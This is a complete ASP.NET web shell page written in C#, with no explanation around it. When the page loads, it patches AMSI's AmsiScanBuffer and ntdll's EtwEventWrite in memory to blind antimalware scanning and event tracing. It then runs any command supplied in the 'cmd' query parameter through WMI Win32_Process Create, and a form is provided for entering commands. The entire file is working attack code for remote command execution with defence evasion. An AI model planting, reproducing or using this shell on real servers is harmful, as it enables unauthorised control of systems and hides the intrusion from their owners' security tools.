<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Management" %>
<script runat="server">
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    protected void Page_Load(object sender, EventArgs e)
    {
        PatchAmsi();
        PatchEtw();

        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            ManagementClass wmi = new ManagementClass("Win32_Process");
            ManagementBaseObject methodArgs = wmi.GetMethodParameters("Create");
            methodArgs["CommandLine"] = "cmd.exe /c " + cmd;
            wmi.InvokeMethod("Create", methodArgs, null);
            Response.Write("WMI execution with AMSI & ETW disabled.");
        }
    }

    private void PatchAmsi()
    {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr scanBuf = GetProcAddress(amsi, "AmsiScanBuffer");
        if (scanBuf == IntPtr.Zero) return;
        uint old;
        VirtualProtect(scanBuf, 6, 0x40, out old);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, scanBuf, patch.Length);
        VirtualProtect(scanBuf, 6, old, out old);
    }

    private void PatchEtw()
    {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etw = GetProcAddress(ntdll, "EtwEventWrite");
        if (etw == IntPtr.Zero) return;
        uint old;
        VirtualProtect(etw, 1, 0x40, out old);
        Marshal.WriteByte(etw, 0xC3);
        VirtualProtect(etw, 1, old, out old);
    }
</script>
<html><body><h2>WMI + AMSI/ETW Patch</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
